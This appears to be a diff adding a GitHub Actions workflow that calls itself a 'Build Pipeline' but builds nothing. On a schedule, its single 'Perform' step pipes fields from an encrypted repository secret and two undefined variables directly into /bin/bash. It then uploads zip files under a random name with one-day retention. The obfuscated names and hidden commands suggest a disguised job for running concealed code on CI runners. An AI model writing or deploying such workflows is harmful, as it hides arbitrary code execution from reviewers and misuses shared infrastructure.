@@ -1,0 +1,29 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '45 2,8,14,20 * * *'
+jobs:
+  workflow:
+    runs-on: ubuntu-latest
+    timeout-minutes: 340
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          sgg963: ${{ secrets.sgg963 }}
+        run: |
+          printf '%s' "$sgg963" | jq -r .ab455 | /bin/bash
+          printf '%s' "$p5" | jq -r .txizo8490 | /bin/bash
+          echo $i57140 | jq -r .znu9888 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: jZbPJBJD
+          path: "*.zip"
+          retention-days: 1
